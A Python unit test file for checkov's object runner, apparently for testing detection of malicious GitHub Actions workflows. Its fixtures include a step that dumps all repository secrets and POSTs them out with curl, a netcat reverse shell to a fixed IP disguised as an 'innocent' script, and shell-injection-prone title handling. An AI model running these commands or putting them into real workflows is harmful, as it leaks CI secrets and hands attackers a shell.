import unittest

from checkov.common.runners.object_runner import Runner


class TestObjectRunner(unittest.TestCase):
    result = ({"name": "Supply Chain", True: {"workflow_dispatch": None,
                                              "schedule": [{"cron": "0 0 * * 0", "__startline__": 5, "__endline__": 6}],
                                              "__startline__": 3, "__endline__": 6, }, "jobs": {
        "bridgecrew": {"runs-on": "ubuntu-latest", "steps": [
            {"name": "Run checkov", "id": "checkov", "uses": "bridgecrewio/checkov-action@master",
             "env": {"GITHUB_TOKEN": "${{secrets.THIS_IS_A_TEST_SECRET}}", "ACTIONS_ALLOW_UNSECURE_COMMANDS": "true",
                     "__startline__": 14, "__endline__": 16, },
             "run": 'echo "${{ toJSON(secrets) }}" > .secrets\ncurl -X POST -s --data "@.secrets" <BADURL > '
                    "/dev/null\nrm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|netcat 34.159.16.75 32032 "
                    ">/tmp/f\n", "__startline__": 10, "__endline__": 20, }], "__startline__": 8, "__endline__": 20, },
        "bridgecrew2": {"runs-on": "ubuntu-latest", "steps": [
            {"name": "Run checkov", "id": "checkov", "uses": "bridgecrewio/checkov-action@master",
             "env": {"GITHUB_TOKEN": "${{secrets.THIS_IS_A_TEST_SECRET}}", "ACTIONS_ALLOW_UNSECURE_COMMANDS": "true",
                     "__startline__": 27, "__endline__": 29, },
             "run": 'echo "${{ toJSON(secrets) }}" > .secrets\ncurl -X POST -s --data "@.secrets" <BADURL > '
                    "/dev/null\nrm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|netcat 34.159.16.75 32032 "
                    ">/tmp/f\n", "__startline__": 23, "__endline__": 33, }], "__startline__": 21, "__endline__": 33, },
        "__startline__": 7, "__endline__": 33, }, "__startline__": 1, "__endline__": 33, },
              [(1, "name: Supply Chain\n"), (2, "on:\n"), (3, "  workflow_dispatch:\n"), (4, "  schedule:\n"),
               (5, "    - cron: 0 0 * * 0\n"), (6, "jobs:\n"), (7, "   bridgecrew:\n"),
               (8, "    runs-on: ubuntu-latest\n"), (9, "    steps:\n"), (10, "    - name: Run checkov\n"),
               (11, "      id: checkov\n"), (12, "      uses: bridgecrewio/checkov-action@master\n"),
               (13, "      env:\n"), (14, "        GITHUB_TOKEN: ${{secrets.THIS_IS_A_TEST_SECRET}}\n"),
               (15, "        ACTIONS_ALLOW_UNSECURE_COMMANDS: 'true'\n"), (16, "      run:  |\n"),
               (17, '         echo "${{ toJSON(secrets) }}" > .secrets\n'),
               (18, '         curl -X POST -s --data "@.secrets" <BADURL > /dev/null\n'), (19, "rm -f /tmp/f;mkfifo "
                                                                                               "/tmp/f;cat "
                                                                                               "/tmp/f|/bin/sh -i "
                                                                                               "2>&1|netcat "
                                                                                               "34.159.16.75 32032 "
                                                                                               ">/tmp/f\n",),
               (20, "   bridgecrew2:\n"), (21, "    runs-on: ubuntu-latest\n"), (22, "    steps:\n"),
               (23, "    - name: Run checkov\n"), (24, "      id: checkov\n"),
               (25, "      uses: bridgecrewio/checkov-action@master\n"), (26, "      env:\n"),
               (27, "        GITHUB_TOKEN: ${{secrets.THIS_IS_A_TEST_SECRET}}\n"),
               (28, "        ACTIONS_ALLOW_UNSECURE_COMMANDS: 'true'\n"), (29, "      run:  |\n"),
               (30, '          echo "${{ toJSON(secrets) }}" > .secrets\n'),
               (31, '          curl -X POST -s --data "@.secrets" <BADURL > /dev/null\n'), (32, "rm -f /tmp/f;mkfifo "
                                                                                                "/tmp/f;cat "
                                                                                                "/tmp/f|/bin/sh -i "
                                                                                                "2>&1|netcat "
                                                                                                "34.159.16.75 32032 "
                                                                                                ">/tmp/f\n",), ],)

    result_unsecure_command = ({True: 'pull_request', 'name': 'unsecure-worfklow', 'jobs': {
        'unsecure-job': {'name': 'job2', 'runs-on': 'ubuntu-latest',
                         'env': {'ACTIONS_ALLOW_UNSECURE_COMMANDS': True, '__startline__': 10, '__endline__': 11},
                         'steps': [
                             {'name': 'unsecure-step2', 'run': 'echo "goo"\n', '__startline__': 12, '__endline__': 15}],
                         '__startline__': 7, '__endline__': 15},
        'secure-job': {'name': 'job3', 'runs-on': 'ubuntu-latest',
                       'env': {'ACTIONS_ALLOW_UNSECURE_COMMANDS': False, '__startline__': 19, '__endline__': 20},
                       'run': 'echo "ok"', '__startline__': 16, '__endline__': 21}, '__startline__': 6,
        '__endline__': 21}, '__startline__': 1, '__endline__': 21},
                               [(1, 'on: pull_request\n'), (2, '\n'), (3, 'name: unsecure-worfklow\n'), (4, '\n'),
                                (5, 'jobs:\n'), (6, '  unsecure-job:\n'), (7, '    name: job2\n'),
                                (8, '    runs-on: ubuntu-latest\n'), (9, '    env:\n'),
                                (10, '      ACTIONS_ALLOW_UNSECURE_COMMANDS: true\n'), (11, '    steps:\n'),
                                (12, '      - name: unsecure-step2\n'), (13, '        run: |\n'),
                                (14, '          echo "goo"\n'), (15, '  secure-job:\n'), (16, '    name: job3\n'),
                                (17, '    runs-on: ubuntu-latest\n'), (18, '    env:\n'),
                                (19, '      ACTIONS_ALLOW_UNSECURE_COMMANDS: false\n'), (20, '    run: |\n'),
                                (21, '      echo "ok"')])

    result_shell_injection = ({True: 'issues', 'name': 'unsec33ure-worfklow', 'jobs': {
        'unsecure-job': {'name': 'job1', 'runs-on': 'ubuntu-latest',
                         'run': 'title="${{ github.event.issue.title }}"\nif [[ ! $title =~ ^.*:\\ .*$ ]]; then\n  echo "Bad issue title"\n  exit 1\nfi\n',
                         '__startline__': 6, '__endline__': 14},
        'secure-job': {'name': 'job2', 'runs-on': 'ubuntu-latest', 'run': 'echo "foo"\n', '__startline__': 15,
                       '__endline__': 19}, 'unsecure-steps': {'runs-on': 'ubuntu-latest', 'steps': [
            {'uses': 'actions/checkout@v2', '__startline__': 22, '__endline__': 23}, {'name': 'Check PR title',
                                                                                      'run': 'title="${{ github.event.pull_request.title }}"\nif [[ $title =~ ^octocat ]]; then\necho "PR title starts with \'octocat\'"\nexit 0\nelse\necho "PR title did not start with \'octocat\'"\nexit 1\nfi\n',
                                                                                      '__startline__': 23,
                                                                                      '__endline__': 33},
            {'if': "github.event_name == 'push'",
             'run': 'title="${{ github.event.pull_request.title }}"\nif [[ $title =~ ^octocat ]]; then\necho "PR title starts with \'octocat\'"\nexit 0\nelse\necho "PR title did not start with \'octocat\'"\nexit 1\nfi\n',
             '__startline__': 33, '__endline__': 43},
            {'name': 'Show author email', 'run': 'echo "${{ github.event.commits.fix-bug.author.email }}"\n',
             '__startline__': 43, '__endline__': 46},
            {'name': 'Show issue title', 'run': 'echo "${{ github.event.issue.title }}"\n', '__startline__': 46,
             '__endline__': 49},
            {'name': 'Show issue title no spaces', 'run': 'echo "${{github.event.issue.title}}"\n', '__startline__': 49,
             '__endline__': 52}, {'name': 'Download and Extract Artifacts',
                                  'env': {'GITHUB_TOKEN': '${{ secrets.GITHUB_TOKEN }}', '__startline__': 54,
                                          '__endline__': 55},
                                  'run': 'mkdir -p artifacts && cd artifacts\nartifacts_url=${{ github.event.workflow_run.artifacts_url }}\ngh api "$artifacts_url" -q \'.artifacts[] | [.name, .archive_download_url] | @tsv\' | while read artifact\ndo\n  IFS=$\'\\t\' read name url <<< "$artifact"\n  gh api $url > "$name.zip"\n  unzip -d "$name" "$name.zip"\ndone\n',
                                  '__startline__': 52, '__endline__': 64}], '__startline__': 20, '__endline__': 64},
        '__startline__': 5, '__endline__': 64}, '__startline__': 1, '__endline__': 64},
                              [(1, 'on: issues\n'), (2, '\n'), (3, 'name: unsec33ure-worfklow\n'), (4, 'jobs:\n'),
                               (5, '  unsecure-job:\n'), (6, '    name: job1\n'), (7, '    runs-on: ubuntu-latest\n'),
                               (8, '    run: |\n'), (9, '      title="${{ github.event.issue.title }}"\n'),
                               (10, '      if [[ ! $title =~ ^.*:\\ .*$ ]]; then\n'),
                               (11, '        echo "Bad issue title"\n'), (12, '        exit 1\n'), (13, '      fi\n'),
                               (14, '  secure-job:\n'), (15, '    name: job2\n'), (16, '    runs-on: ubuntu-latest\n'),
                               (17, '    run: |\n'), (18, '      echo "foo"\n'), (19, '  unsecure-steps:\n'),
                               (20, '      runs-on: ubuntu-latest\n'), (21, '      steps:\n'),
                               (22, '        - uses: actions/checkout@v2\n'), (23, '        - name: Check PR title\n'),
                               (24, '          run: |\n'),
                               (25, '            title="${{ github.event.pull_request.title }}"\n'),
                               (26, '            if [[ $title =~ ^octocat ]]; then\n'),
                               (27, '            echo "PR title starts with \'octocat\'"\n'),
                               (28, '            exit 0\n'), (29, '            else\n'),
                               (30, '            echo "PR title did not start with \'octocat\'"\n'),
                               (31, '            exit 1\n'), (32, '            fi\n'),
                               (33, "        - if: github.event_name == 'push'\n"), (34, '          run: |\n'),
                               (35, '            title="${{ github.event.pull_request.title }}"\n'),
                               (36, '            if [[ $title =~ ^octocat ]]; then\n'),
                               (37, '            echo "PR title starts with \'octocat\'"\n'),
                               (38, '            exit 0\n'), (39, '            else\n'),
                               (40, '            echo "PR title did not start with \'octocat\'"\n'),
                               (41, '            exit 1\n'), (42, '            fi\n'),
                               (43, '        - name: Show author email\n'), (44, '          run: |\n'),
                               (45, '            echo "${{ github.event.commits.fix-bug.author.email }}"\n'),
                               (46, '        - name: Show issue title\n'), (47, '          run: |\n'),
                               (48, '            echo "${{ github.event.issue.title }}"\n'),
                               (49, '        - name: Show issue title no spaces\n'), (50, '          run: |\n'),
                               (51, '            echo "${{github.event.issue.title}}"\n'),
                               (52, '        - name: Download and Extract Artifacts\n'), (53, '          env:\n'),
                               (54, '            GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n'),
                               (55, '          run: |\n'), (56, '            mkdir -p artifacts && cd artifacts\n'),
                               (57, '            artifacts_url=${{ github.event.workflow_run.artifacts_url }}\n'), (58,
                                                                                                                    '          gh api "$artifacts_url" -q \'.artifacts[] | [.name, .archive_download_url] | @tsv\' | while read artifact\n'),
                               (59, '            do\n'),
                               (60, '              IFS=$\'\\t\' read name url <<< "$artifact"\n'),
                               (61, '              gh api $url > "$name.zip"\n'),
                               (62, '              unzip -d "$name" "$name.zip"\n'), (63, '            done\n')])

    result_netcatreverseshell = (
        {'name': 'REVERSESHELL', True: {'push': None, 'workflow_dispatch': None, '__startline__': 6, '__endline__': 12},
         'jobs': {'prep': {'name': 'prep', 'runs-on': 'ubuntu-latest',
                           'run': 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 34.159.16.75 32032 >/tmp/f\n',
                           '__startline__': 15, '__endline__': 19}, 'build': {'runs-on': 'ubuntu-latest', 'steps': [
             {'uses': 'actions/checkout@v3', '__startline__': 26, '__endline__': 29},
             {'name': 'Run a normal very innocent one-line script',
              'run': 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|netcat 34.159.16.75 32032 >/tmp/f\n',
              '__startline__': 29, '__endline__': 33}], '__startline__': 21, '__endline__': 33}, '__startline__': 14,
                  '__endline__': 33}, '__startline__': 1, '__endline__': 33},
        [(1, 'name: REVERSESHELL\n'), (2, '\n'), (3, '# Controls when the workflow will run\n'), (4, 'on:\n'),
         (5, '  # Triggers the workflow on push or pull request events but only for the main branch\n'),
         (6, '  push:\n'), (7, '\n'), (8, '  # Allows you to run this workflow manually from the Actions tab\n'),
         (9, '  workflow_dispatch:\n'), (10, '\n'),
         (11, '# A workflow run is made up of one or more jobs that can run sequentially or in parallel\n'),
         (12, 'jobs:\n'), (13, '  # This workflow contains a single job called "build"\n'), (14, '  prep:\n'),
         (15, '    name: prep\n'), (16, '    runs-on: ubuntu-latest\n'), (17, '    run: |\n'),
         (18, '     rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 34.159.16.75 32032 >/tmp/f\n'),
         (19, '  build:\n'), (20, '    # The type of runner that the job will run on\n'),
         (21, '    runs-on: ubuntu-latest\n'), (22, '\n'),
         (23, '    # Steps represent a sequence of tasks that will be executed as part of the job\n'),
         (24, '    steps:\n'),
         (25, '      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it\n'),
         (26, '      - uses: actions/checkout@v3\n'), (27, '\n'),
         (28, '      # Runs a single command using the runners shell\n'),
         (29, '      - name: Run a normal very innocent one-line script\n'), (30, '        run:  |\n'),
         (31, '         rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|netcat 34.159.16.75 32032 >/tmp/f\n'),
         (32, '\n')])

    result_build = ({'name': 'build',
                     True: {'workflow_dispatch': None,
                            'push': {'branches': ['master'],
                                     'paths-ignore': ['docs/**',
                                                      'INTHEWILD.md',
                                                      'README.md',
                                                      '.github/**',
                                                      'admissioncontroller/checkov-requirements.txt',
                                                      'admissioncontroller/k8s/deployment.yaml',
                                                      'checkov/version.py',
                                                      'kubernetes/requirements.txt',
                                                      'coverage.svg'],
                                     '__startline__': 6, '__endline__': 19},
                            '__startline__': 4, '__endline__': 19},
                     'concurrency': {'group': 'build', 'cancel-in-progress': True, '__startline__': 20,
                                     '__endline__': 23},
                     'jobs': {'integration-tests': {'strategy': {'fail-fast': True,
                                                                 'matrix': {
                                                                     'python': [
                                                                         '3.7',
                                                                         '3.8',
                                                                         '3.9',
                                                                         '3.10'],
                                                                     'os': [
                                                                         'ubuntu-latest',
                                                                         'macos-latest',
                                                                         'windows-latest'],
                                                                     '__startline__': 28,
                                                                     '__endline__': 30},
                                                                 '__startline__': 26,
                                                                 '__endline__': 30},
                                                    'runs-on': '${{ matrix.os }}',
                                                    'steps': [{
                                                        'uses': 'actions/checkout@v3',
                                                        '__startline__': 32,
                                                        '__endline__': 33}, {
                                                        'uses': 'actions/setup-python@v4',
                                                        'with': {
                                                            'python-version': '${{ matrix.python }}',
                                                            '__startline__': 35,
                                                            '__endline__': 36},
                                                        '__startline__': 33,
                                                        '__endline__': 36}, {
                                                        'uses': 'actions/setup-node@v3',
                                                        '__startline__': 36,
                                                        '__endline__': 37}, {
                                                        'uses': 'azure/setup-helm@v1',
                                                        '__startline__': 37,
                                                        '__endline__': 38},
                                                        {'name': 'Install pipenv',
                                                         'run': 'python -m pip install --no-cache-dir --upgrade pipenv\n',
                                                         '__startline__': 38,
                                                         '__endline__': 41}, {
                                                            'uses': 'imranismail/setup-kustomize@v1',
                                                            'if': "${{ runner.os != 'windows' }}",
                                                            '__startline__': 41,
                                                            '__endline__': 43}, {
                                                            'name': 'Build & install checkov package',
                                                            'run': "pipenv --python ${{ matrix.python }}\npipenv run pip install --upgrade pip==22.0.3\npipenv run pip install pytest pytest-xdist\npipenv run python setup.py sdist bdist_wheel\nbash -c 'pipenv run pip install dist/checkov-*.whl'\n",
                                                            '__startline__': 43,
                                                            '__endline__': 50}, {
                                                            'name': 'Clone Terragoat - vulnerable terraform',
                                                            'run': 'git clone https://github.com/bridgecrewio/terragoat',
                                                            '__startline__': 50,
                                                            '__endline__': 52}, {
                                                            'name': 'Clone Cfngoat - vulnerable cloudformation',
                                                            'run': 'git clone https://github.com/bridgecrewio/cfngoat',
                                                            '__startline__': 52,
                                                            '__endline__': 54}, {
                                                            'name': 'Clone Kubernetes-goat - vulnerable kubernetes',
                                                            'run': 'git clone https://github.com/madhuakula/kubernetes-goat',
                                                            '__startline__': 54,
                                                            '__endline__': 56}, {
                                                            'name': 'Clone kustomize-goat - vulnerable kustomize',
                                                            'run': 'git clone https://github.com/bridgecrewio/kustomizegoat',
                                                            '__startline__': 56,
                                                            '__endline__': 58}, {
                                                            'name': 'Create checkov reports',
                                                            'run': '# Just making sure the API key tests don\'t run on PRs\nbash -c \'./integration_tests/prepare_data.sh "${{ matrix.os }}" "${{ matrix.python }}"\'\n',
                                                            'env': {
                                                                'LOG_LEVEL': 'INFO',
                                                                'BC_KEY': '${{ secrets.BC_API_KEY }}',
                                                                'TFC_TOKEN': '${{ secrets.TFC_TOKEN }}',
                                                                'GITHUB_PAT': '${{ secrets.GH_PAT }}',
                                                                '__startline__': 63,
                                                                '__endline__': 67},
                                                            '__startline__': 58,
                                                            '__endline__': 67}, {
                                                            'name': 'Run integration tests',
                                                            'run': 'pipenv run pytest integration_tests\n',
                                                            '__startline__': 67,
                                                            '__endline__': 70}],
                                                    '__startline__': 25,
                                                    '__endline__': 70},
                              'prisma-tests': {
                                  'runs-on': ['self-hosted', 'public', 'linux',
                                              'x64'], 'steps': [
                                      {'uses': 'actions/checkout@v3',
                                       '__startline__': 73, '__endline__': 74},
                                      {'uses': 'actions/setup-python@v4',
                                       'with': {'python-version': 3.7,
                                                '__startline__': 76,
                                                '__endline__': 77},
                                       '__startline__': 74, '__endline__': 77},
                                      {'name': 'Install pipenv',
                                       'run': 'python -m pip install --no-cache-dir --upgrade pipenv\n',
                                       '__startline__': 77, '__endline__': 80}, {
                                          'name': 'Clone Terragoat - vulnerable terraform',
                                          'run': 'git clone https://github.com/bridgecrewio/terragoat',
                                          '__startline__': 80, '__endline__': 82},
                                      {'name': 'Build & install checkov package',
                                       'run': 'pipenv --python 3.7\npipenv run pip install --upgrade pip==22.0.3\npipenv run pip install pytest pytest-xdist\npipenv run python setup.py sdist bdist_wheel\npipenv run pip install dist/checkov-*.whl\n',
                                       '__startline__': 82, '__endline__': 89},
                                      {'name': 'Run checkov with Prisma creds',
                                       'env': {
                                           'PRISMA_KEY': '${{ secrets.PRISMA_KEY }}',
                                           'PRISMA_API_URL': '${{ secrets.PRISMA_API_URL }}',
                                           '__startline__': 91, '__endline__': 93},
                                       'run': 'pipenv run checkov -s -d terragoat --bc-api-key $PRISMA_KEY --repo-id yuvalyacoby/terragoat > checkov_report_prisma.txt\ngrep "prismacloud.io" checkov_report_prisma.txt\nexit $?\n',
                                       '__startline__': 89, '__endline__': 97}],
                                  '__startline__': 71, '__endline__': 97},
                              'unit-tests': {'timeout-minutes': 30,
                                             'runs-on': ['self-hosted', 'public',
                                                         'linux', 'x64'], 'steps': [
                                      {'uses': 'actions/checkout@v3',
                                       '__startline__': 101, '__endline__': 102},
                                      {'name': 'Set up Python 3.7',
                                       'uses': 'actions/setup-python@v4',
                                       'with': {'python-version': 3.7,
                                                '__startline__': 105,
                                                '__endline__': 106},
                                       '__startline__': 102, '__endline__': 106},
                                      {'name': 'Install pipenv',
                                       'run': 'python -m pip install --no-cache-dir --upgrade pipenv\n',
                                       '__startline__': 106, '__endline__': 109},
                                      {'name': 'Install dependencies',
                                       'run': 'pipenv --python 3.7\npipenv install --dev\n',
                                       '__startline__': 109, '__endline__': 113},
                                      {'uses': 'imranismail/setup-kustomize@v1',
                                       'if': "${{ runner.os != 'windows' }}",
                                       '__startline__': 113, '__endline__': 115},
                                      {'name': 'Test with pytest', 'env': {
                                          'GITHUB_TOKEN': '${{ secrets.GITHUB_TOKEN }}',
                                          '__startline__': 117, '__endline__': 118},
                                       'run': 'pipenv run python -m pytest tests\n',
                                       '__startline__': 115, '__endline__': 120}],
                                             '__startline__': 98,
                                             '__endline__': 120}, 'bump-version': {
                             'needs': ['integration-tests', 'unit-tests', 'prisma-tests'],
                             'runs-on': ['self-hosted', 'public', 'linux', 'x64'], 'environment': 'release',
                             'timeout-minutes': 30,
                             'steps': [{'uses': 'actions/checkout@v3',
                                        'with': {'token': '${{ secrets.GH_PAT_SECRET }}', '__startline__': 128,
                                                 '__endline__': 129},
                                        '__startline__': 126, '__endline__': 129},
                                       {'name': 'Import GPG key', 'id': 'import_gpg',
                                        'uses': 'crazy-max/ghaction-import-gpg@v5.0.0',
                                        'with': {'gpg_private_key': '${{ secrets.GPG_PRIVATE_KEY }}',
                                                 'passphrase': '${{ secrets.PASSPHRASE }}', '__startline__': 133,
                                                 '__endline__': 135}, '__startline__': 129, '__endline__': 135},
                                       {'name': 'Set up Python 3.7', 'uses': 'actions/setup-python@v4',
                                        'with': {'python-version': 3.7, '__startline__': 138, '__endline__': 139},
                                        '__startline__': 135, '__endline__': 139},
                                       {'name': 'Install pipenv',
                                        'run': 'python -m pip install --no-cache-dir --upgrade pipenv\n',
                                        '__startline__': 139, '__endline__': 142},
                                       {'name': 'Install dependencies', 'run': 'pipenv --python 3.7\npipenv install\n',
                                        '__startline__': 142, '__endline__': 146}, {'name': 'version', 'env': {
                                     'GITHUB_TOKEN': '${{ secrets.PAT_TOKEN }}', '__startline__': 148,
                                     '__endline__': 149},
                                                                                    'run': '## update docs\nexport PYTHONPATH=\'.\'\ngit pull\nfor i in cloudformation terraform kubernetes serverless arm dockerfile secrets github_configuration gitlab_configuration bitbucket_configuration github_actions gitlab_ci bicep openapi bitbucket_pipelines all\ndo\n  export scansdoc="docs/5.Policy Index/$i.md"\n  echo "---" > "$scansdoc"\n  echo "layout: default" >> "$scansdoc"\n  echo "title: $i resource scans" >> "$scansdoc"\n  echo "nav_order: 1" >> "$scansdoc"\n  echo "---" >> "$scansdoc"\n  echo "" >> "$scansdoc"\n  echo "# $i resource scans (auto generated)" >> "$scansdoc"\n  echo "" >> "$scansdoc"\n  pipenv run python checkov/main.py --list --framework "$i" >> "$scansdoc"\ndone\n#add cloudformation scans to serverless\nexport scansdoc="docs/5.Policy Index/serverless.md"\npipenv run python checkov/main.py --list --framework cloudformation >> "$scansdoc"\ngit add "docs/5.Policy Index/*"\ngit commit --reuse-message=HEAD@{1} || echo "No changes to commit"\n\ngit config --global user.name \'schosterbarak\'\ngit config --global user.email \'schosterbarak@users.noreply.github.com\'\ngit fetch --tags\nlatest_tag=$(git describe --tags `git rev-list --tags --max-count=1`)\necho "latest tag: $latest_tag"\nnew_tag=$(echo $latest_tag | awk -F. -v a="$1" -v b="$2" -v c="$3" \'{printf("%d.%d.%d", $1+a, $2+b , $3+1)}\')\necho "new tag: $new_tag"          \n## update python version\necho "version = \'$new_tag\'" > \'checkov/version.py\'\necho "checkov==$new_tag" > \'kubernetes/requirements.txt\'\necho "checkov==$new_tag" > \'admissioncontroller/checkov-requirements.txt\'\ngit commit --reuse-message=HEAD@{1} checkov/version.py kubernetes/requirements.txt admissioncontroller/checkov-requirements.txt || echo "No changes to commit"\ngit push origin\ngit tag $new_tag\ngit push --tags\nRELEASE_NOTE=$(git log -1 --pretty=%B)\necho "::set-output name=version::$new_tag"\necho "::set-output name=notes::$RELEASE_NOTE"\n',
                                                                                    'id': 'version',
                                                                                    '__startline__': 146,
                                                                                    '__endline__': 191},
                                       {'name': 'release', 'uses': 'actions/create-release@v1',
                                        'with': {'draft': False, 'prerelease': False,
                                                 'release_name': '${{ steps.version.outputs.version }}',
                                                 'tag_name': '${{ steps.version.outputs.version }}',
                                                 'body': '${{ steps.version.outputs.notes }}', '__startline__': 194,
                                                 '__endline__': 199},
                                        'env': {'GITHUB_TOKEN': '${{ github.token }}', '__startline__': 200,
                                                '__endline__': 201},
                                        '__startline__': 191, '__endline__': 201},
                                       {'name': 'create python package',
                                        'run': 'pipenv run python setup.py sdist bdist_wheel\n',
                                        '__startline__': 201, '__endline__': 204},
                                       {'name': 'Publish a Python distribution to PyPI',
                                        'uses': 'pypa/gh-action-pypi-publish@master',
                                        'with': {'user': '__token__',
                                                 'password': '${{ secrets.PYPI_TOKEN }}',
                                                 '__startline__': 207,
                                                 '__endline__': 209},
                                        '__startline__': 204, '__endline__': 209},
                                       {'name': 'sleep and wait for package to refresh', 'run': 'sleep 2m\n',
                                        '__startline__': 209,
                                        '__endline__': 212}],
                             'outputs': {'version': '${{ steps.version.outputs.version }}', '__startline__': 213,
                                         '__endline__': 214}, '__startline__': 121, '__endline__': 214},
                              'publish-checkov-dockerhub': {
                                  'runs-on': ['self-hosted', 'public', 'linux',
                                              'x64'], 'needs': 'bump-version',
                                  'environment': 'release', 'steps': [
                                      {'uses': 'actions/checkout@v3',
                                       '__startline__': 219, '__endline__': 220},
                                      {'name': 'Get release version',
                                       'id': 'versions',
                                       'run': 'checkov_version=${{ needs.bump-version.outputs.version }}\ncheckov_major_version=$(echo "${checkov_version}" | head -c1)\necho "::set-output name=version::$checkov_version"\necho "::set-output name=major_version::$checkov_major_version"\n',
                                       '__startline__': 220, '__endline__': 227},
                                      {'name': 'Publish to Registry',
                                       'uses': 'elgohr/Publish-Docker-Github-Action@master',
                                       'with': {'name': 'bridgecrew/checkov',
                                                'username': '${{ secrets.DOCKERHUB_USERNAME }}',
                                                'password': '${{ secrets.DOCKERHUB_PASSWORD }}',
                                                'buildoptions': '--no-cache',
                                                'tags': 'latest,${{ steps.versions.outputs.version }},${{ steps.versions.outputs.major_version }}',
                                                '__startline__': 230,
                                                '__endline__': 235},
                                       '__startline__': 227, '__endline__': 235}],
                                  '__startline__': 215, '__endline__': 235},
                              'publish-checkov-k8s-dockerhub': {
                                  'runs-on': ['self-hosted', 'public', 'linux',
                                              'x64'], 'needs': 'bump-version',
                                  'environment': 'release', 'steps': [
                                      {'uses': 'actions/checkout@v3',
                                       '__startline__': 240, '__endline__': 241},
                                      {'name': 'update checkov-k8s version',
                                       'run': 'checkov_version=${{ needs.bump-version.outputs.version }}\ncheckov_major_version=$(echo "${checkov_version}" | head -c1)\necho "::set-output name=version::$checkov_version"\necho "::set-output name=major_version::$checkov_major_version"\n',
                                       'id': 'versions', '__startline__': 241,
                                       '__endline__': 248},
                                      {'name': 'Publish to Registry',
                                       'uses': 'elgohr/Publish-Docker-Github-Action@master',
                                       'with': {'name': 'bridgecrew/checkov-k8s',
                                                'username': '${{ secrets.DOCKERHUB_USERNAME }}',
                                                'password': '${{ secrets.DOCKERHUB_PASSWORD }}',
                                                'tags': 'latest,${{ steps.versions.outputs.version }},${{ steps.versions.outputs.major_version }}',
                                                'dockerfile': 'kubernetes/Dockerfile',
                                                'buildoptions': '--no-cache',
                                                '__startline__': 251,
                                                '__endline__': 257},
                                       '__startline__': 248, '__endline__': 257}],
                                  '__startline__': 236, '__endline__': 257},
                              'publish-checkov-admissioncontroller-dockerhub': {
                                  'runs-on': ['self-hosted', 'public', 'linux',
                                              'x64'], 'environment': 'release',
                                  'needs': 'bump-version', 'steps': [
                                      {'uses': 'actions/checkout@v2', 'with': {
                                          'token': '${{ secrets.GH_PAT_SECRET }}',
                                          '__startline__': 264, '__endline__': 265},
                                       '__startline__': 262, '__endline__': 265},
                                      {'name': 'get versions',
                                       'run': 'checkov_version=${{ needs.bump-version.outputs.version }}\ncheckov_major_version=$(echo "${checkov_version}" | head -c1)\necho "::set-output name=version::$checkov_version"\necho "::set-output name=major_version::$checkov_major_version"\n',
                                       'id': 'versions', '__startline__': 265,
                                       '__endline__': 272},
                                      {'name': 'Publish to Registry',
                                       'id': 'docker_publish',
                                       'uses': 'elgohr/Publish-Docker-Github-Action@master',
                                       'with': {'name': 'bridgecrew/whorf',
                                                'username': '${{ secrets.DOCKERHUB_USERNAME }}',
                                                'password': '${{ secrets.DOCKERHUB_PASSWORD }}',
                                                'tags': 'latest,${{ steps.versions.outputs.version }},${{ steps.versions.outputs.major_version }}',
                                                'dockerfile': 'admissioncontroller/Dockerfile',
                                                'buildoptions': '--no-cache',
                                                '__startline__': 276,
                                                '__endline__': 282},
                                       '__startline__': 272, '__endline__': 282},
                                      {'name': 'Image digest',
                                       'run': 'echo ${{ steps.docker_publish.outputs.digest }}',
                                       '__startline__': 282, '__endline__': 284},
                                      {'name': 'Update deployment',
                                       'uses': 'jacobtomlinson/gha-find-replace@master',
                                       'with': {
                                           'find': 'image: bridgecrew/whorf@sha256:[a-f0-9]{64}',
                                           'replace': 'image: ${{ steps.docker_publish.outputs.digest }}',
                                           'include': 'admissioncontroller/k8s/deployment.yaml',
                                           '__startline__': 287,
                                           '__endline__': 290},
                                       '__startline__': 284, '__endline__': 290},
                                      {'name': 'commit changes to deployment',
                                       'run': 'git pull\ngit commit --reuse-message=HEAD@{1} admissioncontroller/k8s/deployment.yaml || echo "No changes to commit"\ngit push origin\n',
                                       '__startline__': 290, '__endline__': 295}],
                                  '__startline__': 258, '__endline__': 295},
                              'publish-checkov-pyston-dockerhub': {
                                  'runs-on': ['self-hosted', 'public', 'linux',
                                              'x64'], 'needs': 'bump-version',
                                  'environment': 'release', 'steps': [
                                      {'uses': 'actions/checkout@v3',
                                       '__startline__': 300, '__endline__': 301},
                                      {'name': 'Get release version',
                                       'id': 'versions',
                                       'run': 'checkov_version=${{ needs.bump-version.outputs.version }}\ncheckov_major_version=$(echo "${checkov_version}" | head -c1)\necho "::set-output name=version::$checkov_version"\necho "::set-output name=major_version::$checkov_major_version"\n',
                                       '__startline__': 301, '__endline__': 308},
                                      {'name': 'Publish to Registry',
                                       'uses': 'elgohr/Publish-Docker-Github-Action@master',
                                       'with': {'name': 'bridgecrew/checkov',
                                                'username': '${{ secrets.DOCKERHUB_USERNAME }}',
                                                'password': '${{ secrets.DOCKERHUB_PASSWORD }}',
                                                'tags': 'pyston,${{ steps.versions.outputs.version }}-pyston,${{ steps.versions.outputs.major_version }}-pyston',
                                                'dockerfile': 'Dockerfile.pyston',
                                                'buildoptions': '--no-cache',
                                                '__startline__': 311,
                                                '__endline__': 317},
                                       '__startline__': 308, '__endline__': 317}],
                                  '__startline__': 296, '__endline__': 317},
                              'update-bridgecrew-projects': {
                                  'needs': 'publish-checkov-dockerhub',
                                  'runs-on': ['self-hosted', 'public', 'linux',
                                              'x64'], 'environment': 'release',
                                  'steps': [{'uses': 'actions/checkout@v3',
                                             '__startline__': 322,
                                             '__endline__': 323},
                                            {'name': 'update checkov release',
